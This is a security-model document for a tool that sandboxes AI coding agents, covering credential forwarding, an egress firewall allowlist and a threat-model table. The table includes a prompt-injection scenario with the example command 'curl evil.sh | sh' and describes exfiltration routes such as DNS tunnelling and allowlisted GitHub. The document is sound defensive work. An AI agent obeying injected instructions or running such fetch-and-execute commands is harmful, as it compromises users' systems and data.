# Security Model

## OAuth Token Lifetime

Agent OAuth access tokens are short-lived and the refresh tokens that renew them
are single-use. If an agent refreshed its token inside the `--rm` container, the
rotated token would be discarded on exit, logging the host out, and parallel
containers sharing one host login would race on the single-use refresh token and
invalidate each other. Two host-side measures keep the in-container token valid
for as long as possible and make any shortfall visible:

- **Host pre-launch refresh.** Before staging, `project-sandbox` runs the agent's
  own CLI on the host (`claude auth status` / `codex login status`) so the tool
  refreshes and persists its token using its own maintained logic; the refreshed
  credential is then staged, so the container starts with a near-full window.
  This runs under a per-agent lock, is best-effort, and is skipped with
  `--no-token-refresh`. OpenCode has no delegated refresh.
- **Start-of-session warning.** When credentials are forwarded, the launch prints
  the remaining lifetime of the staged token (`claudeAiOauth.expiresAt` for
  Claude; the `exp` claim of the Codex access-token JWT). If the session outlives
  it, the in-container agent refreshes the token using the host's single-use
  refresh token. The session keeps working, but that rotation invalidates the
  host login, so you need to re-authenticate on the host and re-run to re-stage
  afterward. Sessions are not killed at the deadline. For OpenCode, the
  soonest-expiring OAuth provider in its `auth.json` is used; long-lived/API-key
  providers carry no host-logout risk and show no warning.
- `--no-forward-credentials` starts the container unauthenticated. Host
  credentials are not read, staged, or mounted; any credentials left in the
  staging area by a previous forwarding run are removed, and the generated
  `devcontainer.json` is rendered credential-free. It also disables the host
  refresh and start-of-session warning. Direct CLI runs may opt in to API-key
  environment injection with `--api-key-env NAME` or `--api-key-env-file FILE`;
  dry-runs redact values, but real runs still pass those values through the
  runtime process environment.

OpenCode can be configured with multiple providers. The default firewall allows
OpenAI and Anthropic endpoints; use `--allow-github` for GitHub Copilot, or
`--extra-domain DOMAIN` for another provider endpoint.

## Network Firewall

When the firewall is enabled by default, `init-firewall.sh` runs as root inside
the container and:

- Sets `iptables` and `ip6tables` policies to DROP.
- Pre-resolves allowlisted domains using the resolvers in `/etc/resolv.conf`,
  pins the resulting addresses into `/etc/hosts` and `ipset`, then blocks
  general outbound DNS to close DNS-tunnel exfiltration.
- Allows Claude/Anthropic endpoints (`api.anthropic.com`, `claude.ai`,
  `code.claude.com`, `platform.claude.com`), `api.openai.com`,
  `auth.openai.com`, and `chatgpt.com`.
- When `--allow-github` is set, also allows GitHub's published web/API/git IP
  ranges and DNS-pinned GitHub/Copilot hosts, including `github.com`,
  `api.github.com`, `uploads.github.com`, `codeload.github.com`,
  `lfs.github.com`, `raw.githubusercontent.com`, `objects.githubusercontent.com`,
  `github-cloud.githubusercontent.com`, `api.githubcopilot.com`,
  `api.individual.githubcopilot.com`, `api.business.githubcopilot.com`,
  `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`,
  `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`,
  and `collector.github.com`.
- In the devcontainer firewall variant only, allows the host gateway address so
  port-forwarding and IDE attach work. Direct CLI runs omit this host-network
  allowlist.
- Mirrors the IPv4 allowlist into a parallel IPv6 set; falls back to disabling
  IPv6 via `sysctl` when `ip6_tables` is unavailable. The script exits with an
  error if both `ip6tables` and `sysctl` are unavailable.

Domain allowlists are resolved once when the container starts, then pinned as IP
addresses in `ipset`. CDN-backed services can rotate IPs during long sessions; if
an allowlisted service starts failing after it initially worked, restart the
container or devcontainer so the firewall resolves fresh addresses.

Customize:

- `--extra-domain DOMAIN` appends entries to the allowlist, such as
  `registry.npmjs.org`, private registries, or internal APIs. Repeatable.
- `--allow-github` allows GitHub and GitHub Copilot endpoints. This is useful for
  GitHub-backed workflows, but it also creates a viable exfiltration path through
  GitHub.
- `--no-firewall` skips the firewall entirely. Use it only for trusted-network
  debugging.

## Threat Model

| Threat | Mitigation |
|---|---|
| Agent reads `~/.ssh`, `~/Library`, etc. | Arbitrary host home directories are not mounted by default. Apple `container` adds a VM boundary; Docker/Podman rely on the host's container isolation. |
| Agent deletes the wrong project directory | The workspace, generated config, staged agent credentials, optional `--mount` entries, and worktree-mode `.git` metadata are the intentional host mounts; everything else lives in the disposable container or VM. |
| Agent exfiltrates the workspace to an arbitrary server | iptables egress allowlist with default DROP and domain whitelist for both IPv4 and IPv6. |
| DNS tunneling exfiltration | Allowlisted domains are pre-resolved at startup and general outbound DNS is blocked afterward. |
| Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
| Malicious npm post-install scripts | Run as UID 1000 inside the container; no access to unmounted host paths. |
| Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `disable_update_check = true` for Codex. OpenCode config is not currently sanitized; see `TODO.md`. |
| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
| API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
| Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
| Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |

The tool does not protect against:

- Exfiltration via whitelisted endpoints, such as committing secrets to a GitHub
  repo.
- Misuse of an agent's own API token, which is by definition available to the
  agent.
- IPv6 egress when `ip6_tables` is unavailable and `sysctl` cannot disable IPv6;
  the firewall script exits with an error in that case rather than silently
  proceeding.

## Troubleshooting

- **No supported runtime found.** Install Apple `container` on macOS, or
  Docker/Podman on Linux. You can also pass `--runtime docker`,
  `--runtime podman`, or `--runtime apple-container` explicitly.
- **`container system start` failed.** Make sure macOS 15+ is current and
  `apple/container` is installed; the tool calls `container system start`
  idempotently before building when the Apple runtime is selected.
- **Build OOM on Apple `container`.** The builder VM is separate from run VMs.
  Bump it with `container builder start --memory 8g --cpus 8`, then re-run
  `project-sandbox`.
- **Stale image after an out-of-band change.** Builds are skipped when the
  generated inputs are unchanged and the image still exists; the decision uses a
  fingerprint recorded in `.project-sandbox/.build-state.json` (a non-sensitive
  tag + hash). If the image was modified outside project-sandbox, pass
  `--force-build` to rebuild.
- **GitHub meta API timeout.** The firewall script falls back to an empty
  `{web,api,git,ipv6}` set and starts with a partial allowlist. Re-running the
  agent later will retry.
- **`ip6tables` unavailable.** The script attempts
  `sysctl net.ipv6.conf.all.disable_ipv6=1` first. If that also fails, the script
  aborts with an error.
- **Credentials look stale.** Re-run `project-sandbox` on the host to refresh the
  `/tmp` credential staging directory from the host agent config or macOS
  Keychain. The CLI also refreshes a near-expiry host Claude token before staging
  unless `--no-token-refresh` is set.
- **Env vars in `vminitd.log`.** apple/container logs the full process
  environment. Default forwarded agent tokens are passed through mounted
  credential files only; identity env vars are low-sensitivity. Values injected
  with `--api-key-env` or `--api-key-env-file` are process environment secrets
  and may appear in runtime metadata or logs.
- **Rootless Podman firewall setup fails.** The default firewall needs
  `NET_ADMIN` and `NET_RAW`. Use a Podman setup that permits those capabilities,
  or pass `--no-firewall` only for trusted-network debugging.

## Limitations

- Base images, including the final stage of a Dockerfile passed with
  `--dockerfile`, must be Debian or Ubuntu based. The firewall depends on `apt`
  packages including `aggregate`, which Alpine does not ship.
- Direct Python CLI runs support Apple `container`, Docker, and Podman.
  Docker/Podman provide container isolation rather than the Apple MicroVM
  boundary. Incus is a future backend candidate, but it has a different
  image/import and launch lifecycle from the generated Dockerfile flow used here.
- The generated `.devcontainer/` targets local Docker-compatible runtimes such as
  Docker Desktop or OrbStack; remote services may require rewriting local mounts
  and relaxing or replacing firewall capability requirements.
- `--branch` creates an isolated workspace for the agent. In git repos it creates
  a git worktree on the given branch, mounts the worktree at `/workspace`, and
  bind-mounts the main repo's `.git/` so `git` works correctly inside the
  container. In jj repos it creates a jj workspace plus bookmark, mounts that
  workspace at `/workspace`, and bind-mounts the main repo's `.jj/` metadata so
  `jj` works inside the container. After the session, `--after-session` controls
  whether to ask interactively, merge/rebase back into the main workspace, open a
  PR, or do nothing. Worktree-of-worktree setups are not supported.
- `jj` is installed in the container and configured with the same global
  name/email identity passed to Git.
